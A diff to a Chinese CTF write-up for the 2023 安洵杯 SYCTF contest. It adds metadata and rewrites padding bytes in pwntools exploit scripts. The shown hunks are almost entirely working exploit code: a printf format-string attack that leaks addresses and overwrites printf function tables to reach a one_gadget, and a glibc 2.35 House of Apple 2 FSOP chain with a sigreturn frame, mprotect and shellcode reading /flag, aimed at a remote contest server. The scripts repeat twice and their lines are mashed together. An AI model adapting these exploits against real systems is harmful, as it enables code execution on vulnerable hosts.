@@ -74,6 +74,9 @@ prerequisites:
 - Python pwntools / telnetlib 远程交互
 - libc 2.35 House of Apple 2 (FSOP)
 - RSA Coppersmith + Sage
+contest_normalized: "安洵杯 SYCTF"
+contest_year: 2023
+subcategory_guess: "reverse"
 ---
 # 2023 安洵杯SYCTF writeup by Arr3stY0u
 
@@ -246,34 +249,34 @@ procname = './pwn'libcname = './libc.so.6'
 n2b = lambda x : str(x).encode()rv = lambda x : io.recv(x)ru = lambda s : io.recvuntil(s, drop=True)sd = lambda s : io.send(s)sl = lambda s : io.sendline(s)sn = lambda s : sl(n2b(n))sa = lambda p, s : io.sendafter(p, s)sla = lambda p, s : io.sendlineafter(p, s)sna = lambda p, n : sla(p, n2b(n))ia = lambda : io.interactive()rop = lambda r : flat([p64(x) for x in r])
 sa(b' game!n', b'a' * 28 + p32(0))rand_list=[1804289348,846930915,1681692750,1714636888,1957747830,424238300,719885423,1649760457,596516622,1189641450,1025202335,1350490000,783368663,1102520032,2044897736,1967513955,1365180505,1540383463,304089201,1303455709,35005248]
 for i in range(len(rand_list)): sla(b'input:', str(rand_list[i]).encode())
-sa(b'input your data ;)n', b'%pAAAA ')heap = int(ru(b'AAAA'), 16)success(f'leak heap: {hex(heap)}')
-sa(b'input your data ;)n', b'%11$llxAAAA ')libc.address = int(ru(b'AAAA'), 16) - libc.sym.__libc_start_main + 128 - 0x50success(f'leak libc.address: {hex(libc.address)}')
+sa(b'input your data ;)n', b'%pAAAA\\x00')heap = int(ru(b'AAAA'), 16)success(f'leak heap: {hex(heap)}')
+sa(b'input your data ;)n', b'%11$llxAAAA\\x00')libc.address = int(ru(b'AAAA'), 16) - libc.sym.__libc_start_main + 128 - 0x50success(f'leak libc.address: {hex(libc.address)}')
 printf_arginfo = libc.address + 0x21A8B0success(f'printf_arginfo: {hex(printf_arginfo)}')printf_functable = libc.address + 0x21b9c8success(f'printf_functable: {hex(printf_functable)}')
-sa(b'input your data ;)n', b'%15$pAAAA ')stack = int(ru(b'AAAA'), 16)success(f'leak stack: {hex(stack)}')
+sa(b'input your data ;)n', b'%15$pAAAA\\x00')stack = int(ru(b'AAAA'), 16)success(f'leak stack: {hex(stack)}')
 ra = stack - 0x110
-sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{printf_arginfo&0xffff}c%45$hn '.encode())
-sa(b'input your data ;)n', f'%{(ra + 2)&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{(printf_arginfo >> 16) & 0xff}c%45$hhn '.encode())
-sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{heap&0xffff}c%11$hn '.encode())
-sa(b'input your data ;)n', f'%{(printf_arginfo + 2) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 16)&0xffff}c%11$hn '.encode())
-sa(b'input your data ;)n', f'%{(printf_arginfo + 4) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 32)&0xffff}c%11$hn '.encode())
-sa(b'input your data ;)n', f'%{printf_functable & 0xffff}c%45$hn '.encode())sa(b'input your data ;)n', b'A%11$hhn ')
+sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn\\x00'.encode())sa(b'input your data ;)n', f'%{printf_arginfo&0xffff}c%45$hn\\x00'.encode())
+sa(b'input your data ;)n', f'%{(ra + 2)&0xffff}c%15$hn\\x00'.encode())sa(b'input your data ;)n', f'%{(printf_arginfo >> 16) & 0xff}c%45$hhn\\x00'.encode())
+sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn\\x00'.encode())sa(b'input your data ;)n', f'%{heap&0xffff}c%11$hn\\x00'.encode())
+sa(b'input your data ;)n', f'%{(printf_arginfo + 2) & 0xff}c%45$hhn\\x00'.encode())sa(b'input your data ;)n', f'%{(heap >> 16)&0xffff}c%11$hn\\x00'.encode())
+sa(b'input your data ;)n', f'%{(printf_arginfo + 4) & 0xff}c%45$hhn\\x00'.encode())sa(b'input your data ;)n', f'%{(heap >> 32)&0xffff}c%11$hn\\x00'.encode())
+sa(b'input your data ;)n', f'%{printf_functable & 0xffff}c%45$hn\\x00'.encode())sa(b'input your data ;)n', b'A%11$hhn\\x00')
 import subprocess
 def get_one_gadgets(): one_gadgets = [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '-l', '1', '--raw', libcname]).decode().split(' ')] debug(f'search one gadgets from {libcname}: {[hex(i) for i in one_gadgets]}') return one_gadgets
-import syssa(b'input your data ;)n', b'%A'.ljust(8, b' ') + p64(get_one_gadgets()[int(sys.argv[1])]) * 0x41)
+import syssa(b'input your data ;)n', b'%A'.ljust(8, b'\\x00') + p64(get_one_gadgets()[int(sys.argv[1])]) * 0x41)
 ia()
 
 from pwn import *context(os='linux', arch='amd64')#, log_level='debug')
 procname = './pwn'libcname = './libc.so.6'
 # io = process(procname, stdin=PTY)io = remote('47.108.165.60', 22692)elf = ELF(procname)libc = ELF(libcname)
 n2b = lambda x : str(x).encode()rv = lambda x : io.recv(x)ru = lambda s : io.recvuntil(s, drop=True)sd = lambda s : io.send(s)sl = lambda s : io.sendline(s)sn = lambda s : sl(n2b(n))sa = lambda p, s : io.sendafter(p, s)sla = lambda p, s : io.sendlineafter(p, s)sna = lambda p, n : sla(p, n2b(n))ia = lambda : io.interactive()rop = lambda r : flat([p64(x) for x in r])
-def leakaddr(pre = None, suf = None, bit = 64, keepsuf = True, off = 0): u = {64: u64, 32: u32} num = 6 if bit == 64 else 4 if pre is not None: ru(pre) if suf is not None: r = ru(suf) if keepsuf: r += suf r = r[-num:] else: r = rv(num) return u[bit](r.ljust(bit//8, b' ')) - off
+def leakaddr(pre = None, suf = None, bit = 64, keepsuf = True, off = 0): u = {64: u64, 32: u32} num = 6 if bit == 64 else 4 if pre is not None: ru(pre) if suf is not None: r = ru(suf) if keepsuf: r += suf r = r[-num:] else: r = rv(num) return u[bit](r.ljust(bit//8, b'\\x00')) - off
 prompt = b':'prompt_menu = b'>> n'prompt_idx = prompt
 op = lambda x : sla(prompt_menu, n2b(x))snap = lambda n : sna(prompt, n)sidx = lambda x : sla(prompt_idx, n2b(x))sap = lambda s : sa(prompt, s)slap = lambda s : sla(prompt, s)
 def add(size, content): op(1) snap(size) sap(content)
 def edit(idx, content): op(4) sidx(idx) sap(content)
 def show(idx): op(3) sidx(idx)
 def free(idx): op(2) sidx(idx)
-add(0x90, b' ')add(0x90, b'1')free(0)add(0x90, b' ')show(0)heap = leakaddr(pre=b'context:n') << 12success(f'leak heap: {hex(heap)}')free(0)free(1)
+add(0x90, b'\\x00')add(0x90, b'1')free(0)add(0x90, b'\\x00')show(0)heap = leakaddr(pre=b'context:n') << 12success(f'leak heap: {hex(heap)}')free(0)free(1)
 fake_chunk = heap + 0x3e0
 add(0xf10, rop([0, 0x1EA1, fake_chunk, fake_chunk]))add(0xef0, b'1')add(0x88, b'2')add(0xef0, b'3')add(0xa0, b'4')
 edit(2, b'a' * 0x80 + p64(0x1EA0))
@@ -286,9 +289,9 @@ ptr = libc.sym._IO_list_allfd = (fake_chunk >> 12) ^ ptredit(0, rop([0, 0x310, f
 fake_io_addr = fake_chunk + 0x10frame_addr = fake_io_addr + 0x100
 frame = SigreturnFrame()frame.rip = libc.sym.mprotectframe.rdi = heapframe.rsi = 0x10000frame.rdx = 7frame.rsp = fake_io_addr + 0xf0
 code_addr = frame_addr + len(bytes(frame))
-fake_io_file = rop([ u64(b'/flag'.ljust(8, b' ')), 0, # 0x00 1, libc.sym.setcontext + 0x3d, # 0x10 1, frame_addr, # 0x20 0, 0, # 0x30 0, 0, # 0x40 0, 0, # 0x50 0, 0, # 0x60 0, 0, # 0x70 0, heap, # 0x80 0, 0, # 0x90 fake_io_addr + 8, 0, # 0xa0 0, 0, # 0xb0 1, 0, # 0xc0 0, libc.sym._IO_wfile_jumps + 0x30, # 0xd0 0, fake_io_addr, # 0xe0 code_addr, 0, # 0xf0])
+fake_io_file = rop([ u64(b'/flag'.ljust(8, b'\\x00')), 0, # 0x00 1, libc.sym.setcontext + 0x3d, # 0x10 1, frame_addr, # 0x20 0, 0, # 0x30 0, 0, # 0x40 0, 0, # 0x50 0, 0, # 0x60 0, 0, # 0x70 0, heap, # 0x80 0, 0, # 0x90 fake_io_addr + 8, 0, # 0xa0 0, 0, # 0xb0 1, 0, # 0xc0 0, libc.sym._IO_wfile_jumps + 0x30, # 0xd0 0, fake_io_addr, # 0xe0 code_addr, 0, # 0xf0])
 code = shellcraft.open(fake_io_addr, 0) + shellcraft.sendfile(2, 3, 0, 0x50)
-payload = fake_io_file + bytes(frame) + asm(code) + b' ' * 10
+payload = fake_io_file + bytes(frame) + asm(code) + b'\\x00' * 10
 add(0x300, payload)
 add(0x300, p64(fake_io_addr))
 ia()
@@ -569,33 +572,33 @@ procname = './pwn'libcname = './libc.so.6'
 n2b = lambda x : str(x).encode()rv = lambda x : io.recv(x)ru = lambda s : io.recvuntil(s, drop=True)sd = lambda s : io.send(s)sl = lambda s : io.sendline(s)sn = lambda s : sl(n2b(n))sa = lambda p, s : io.sendafter(p, s)sla = lambda p, s : io.sendlineafter(p, s)sna = lambda p, n : sla(p, n2b(n))ia = lambda : io.interactive()rop = lambda r : flat([p64(x) for x in r])
 sa(b' game!n', b'a' * 28 + p32(0))rand_list=[1804289348,846930915,1681692750,1714636888,1957747830,424238300,719885423,1649760457,596516622,1189641450,1025202335,1350490000,783368663,1102520032,2044897736,1967513955,1365180505,1540383463,304089201,1303455709,35005248]
 for i in range(len(rand_list)): sla(b'input:', str(rand_list[i]).encode())
-sa(b'input your data ;)n', b'%pAAAA ')heap = int(ru(b'AAAA'), 16)success(f'leak heap: {hex(heap)}')
-sa(b'input your data ;)n', b'%11$llxAAAA ')libc.address = int(ru(b'AAAA'), 16) - libc.sym.__libc_start_main + 128 - 0x50success(f'leak libc.address: {hex(libc.address)}')
+sa(b'input your data ;)n', b'%pAAAA\\x00')heap = int(ru(b'AAAA'), 16)success(f'leak heap: {hex(heap)}')
+sa(b'input your data ;)n', b'%11$llxAAAA\\x00')libc.address = int(ru(b'AAAA'), 16) - libc.sym.__libc_start_main + 128 - 0x50success(f'leak libc.address: {hex(libc.address)}')
 printf_arginfo = libc.address + 0x21A8B0success(f'printf_arginfo: {hex(printf_arginfo)}')printf_functable = libc.address + 0x21b9c8success(f'printf_functable: {hex(printf_functable)}')
-sa(b'input your data ;)n', b'%15$pAAAA ')stack = int(ru(b'AAAA'), 16)success(f'leak stack: {hex(stack)}')
+sa(b'input your data ;)n', b'%15$pAAAA\\x00')stack = int(ru(b'AAAA'), 16)success(f'leak stack: {hex(stack)}')
 ra = stack - 0x110
-sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{printf_arginfo&0xffff}c%45$hn '.encode())
-sa(b'input your data ;)n', f'%{(ra + 2)&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{(printf_arginfo >> 16) & 0xff}c%45$hhn '.encode())
-sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{heap&0xffff}c%11$hn '.encode())
-sa(b'input your data ;)n', f'%{(printf_arginfo + 2) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 16)&0xffff}c%11$hn '.encode())
-sa(b'input your data ;)n', f'%{(printf_arginfo + 4) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 32)&0xffff}c%11$hn '.encode())
-sa(b'input your data ;)n', f'%{printf_functable & 0xffff}c%45$hn '.encode())sa(b'input your data ;)n', b'A%11$hhn ')
+sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn\\x00'.encode())sa(b'input your data ;)n', f'%{printf_arginfo&0xffff}c%45$hn\\x00'.encode())
+sa(b'input your data ;)n', f'%{(ra + 2)&0xffff}c%15$hn\\x00'.encode())sa(b'input your data ;)n', f'%{(printf_arginfo >> 16) & 0xff}c%45$hhn\\x00'.encode())
+sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn\\x00'.encode())sa(b'input your data ;)n', f'%{heap&0xffff}c%11$hn\\x00'.encode())
+sa(b'input your data ;)n', f'%{(printf_arginfo + 2) & 0xff}c%45$hhn\\x00'.encode())sa(b'input your data ;)n', f'%{(heap >> 16)&0xffff}c%11$hn\\x00'.encode())
+sa(b'input your data ;)n', f'%{(printf_arginfo + 4) & 0xff}c%45$hhn\\x00'.encode())sa(b'input your data ;)n', f'%{(heap >> 32)&0xffff}c%11$hn\\x00'.encode())
+sa(b'input your data ;)n', f'%{printf_functable & 0xffff}c%45$hn\\x00'.encode())sa(b'input your data ;)n', b'A%11$hhn\\x00')
 import subprocess
 def get_one_gadgets(): one_gadgets = [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '-l', '1', '--raw', libcname]).decode().split(' ')] debug(f'search one gadgets from {libcname}: {[hex(i) for i in one_gadgets]}') return one_gadgets
-import syssa(b'input your data ;)n', b'%A'.ljust(8, b' ') + p64(get_one_gadgets()[int(sys.argv[1])]) * 0x41)
+import syssa(b'input your data ;)n', b'%A'.ljust(8, b'\\x00') + p64(get_one_gadgets()[int(sys.argv[1])]) * 0x41)
 ia()
 from pwn import *context(os='linux', arch='amd64')#, log_level='debug')
 procname = './pwn'libcname = './libc.so.6'
 # io = process(procname, stdin=PTY)io = remote('47.108.165.60', 22692)elf = ELF(procname)libc = ELF(libcname)
 n2b = lambda x : str(x).encode()rv = lambda x : io.recv(x)ru = lambda s : io.recvuntil(s, drop=True)sd = lambda s : io.send(s)sl = lambda s : io.sendline(s)sn = lambda s : sl(n2b(n))sa = lambda p, s : io.sendafter(p, s)sla = lambda p, s : io.sendlineafter(p, s)sna = lambda p, n : sla(p, n2b(n))ia = lambda : io.interactive()rop = lambda r : flat([p64(x) for x in r])
-def leakaddr(pre = None, suf = None, bit = 64, keepsuf = True, off = 0): u = {64: u64, 32: u32} num = 6 if bit == 64 else 4 if pre is not None: ru(pre) if suf is not None: r = ru(suf) if keepsuf: r += suf r = r[-num:] else: r = rv(num) return u[bit](r.ljust(bit//8, b' ')) - off
+def leakaddr(pre = None, suf = None, bit = 64, keepsuf = True, off = 0): u = {64: u64, 32: u32} num = 6 if bit == 64 else 4 if pre is not None: ru(pre) if suf is not None: r = ru(suf) if keepsuf: r += suf r = r[-num:] else: r = rv(num) return u[bit](r.ljust(bit//8, b'\\x00')) - off
 prompt = b':'prompt_menu = b'>> n'prompt_idx = prompt
 op = lambda x : sla(prompt_menu, n2b(x))snap = lambda n : sna(prompt, n)sidx = lambda x : sla(prompt_idx, n2b(x))sap = lambda s : sa(prompt, s)slap = lambda s : sla(prompt, s)
 def add(size, content): op(1) snap(size) sap(content)
 def edit(idx, content): op(4) sidx(idx) sap(content)
 def show(idx): op(3) sidx(idx)
 def free(idx): op(2) sidx(idx)
-add(0x90, b' ')add(0x90, b'1')free(0)add(0x90, b' ')show(0)heap = leakaddr(pre=b'context:n') << 12success(f'leak heap: {hex(heap)}')free(0)free(1)
+add(0x90, b'\\x00')add(0x90, b'1')free(0)add(0x90, b'\\x00')show(0)heap = leakaddr(pre=b'context:n') << 12success(f'leak heap: {hex(heap)}')free(0)free(1)
 fake_chunk = heap + 0x3e0
 add(0xf10, rop([0, 0x1EA1, fake_chunk, fake_chunk]))add(0xef0, b'1')add(0x88, b'2')add(0xef0, b'3')add(0xa0, b'4')
 edit(2, b'a' * 0x80 + p64(0x1EA0))
@@ -608,9 +611,9 @@ ptr = libc.sym._IO_list_allfd = (fake_chunk >> 12) ^ ptredit(0, rop([0, 0x310, f
 fake_io_addr = fake_chunk + 0x10frame_addr = fake_io_addr + 0x100
 frame = SigreturnFrame()frame.rip = libc.sym.mprotectframe.rdi = heapframe.rsi = 0x10000frame.rdx = 7frame.rsp = fake_io_addr + 0xf0
 code_addr = frame_addr + len(bytes(frame))
-fake_io_file = rop([ u64(b'/flag'.ljust(8, b' ')), 0, # 0x00 1, libc.sym.setcontext + 0x3d, # 0x10 1, frame_addr, # 0x20 0, 0, # 0x30 0, 0, # 0x40 0, 0, # 0x50 0, 0, # 0x60 0, 0, # 0x70 0, heap, # 0x80 0, 0, # 0x90 fake_io_addr + 8, 0, # 0xa0 0, 0, # 0xb0 1, 0, # 0xc0 0, libc.sym._IO_wfile_jumps + 0x30, # 0xd0 0, fake_io_addr, # 0xe0 code_addr, 0, # 0xf0])
+fake_io_file = rop([ u64(b'/flag'.ljust(8, b'\\x00')), 0, # 0x00 1, libc.sym.setcontext + 0x3d, # 0x10 1, frame_addr, # 0x20 0, 0, # 0x30 0, 0, # 0x40 0, 0, # 0x50 0, 0, # 0x60 0, 0, # 0x70 0, heap, # 0x80 0, 0, # 0x90 fake_io_addr + 8, 0, # 0xa0 0, 0, # 0xb0 1, 0, # 0xc0 0, libc.sym._IO_wfile_jumps + 0x30, # 0xd0 0, fake_io_addr, # 0xe0 code_addr, 0, # 0xf0])
 code = shellcraft.open(fake_io_addr, 0) + shellcraft.sendfile(2, 3, 0, 0x50)
-payload = fake_io_file + bytes(frame) + asm(code) + b' ' * 10
+payload = fake_io_file + bytes(frame) + asm(code) + b'\\x00' * 10
 add(0x300, payload)
 add(0x300, p64(fake_io_addr))
 ia()
